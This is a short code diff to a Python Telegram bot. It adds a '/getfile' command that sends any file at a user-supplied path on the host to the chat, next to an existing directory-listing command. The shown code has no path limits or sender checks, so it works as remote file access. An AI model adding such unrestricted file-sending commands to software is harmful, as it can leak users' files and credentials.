@@ -45,6 +45,10 @@ def handler(msg):
                 else:
                     filelist = get_dir_list(filepath)
                     bot.sendMessage(chat_id, filelist)
+            elif command == "/getfile":
+                filepath = " ".join(args)
+                if os.path.exists(filepath):
+                    bot.sendDocument(chat_id, open(filepath, "rb"))
 
 
 bot = telepot.Bot(TELEGRAM_TOKEN)
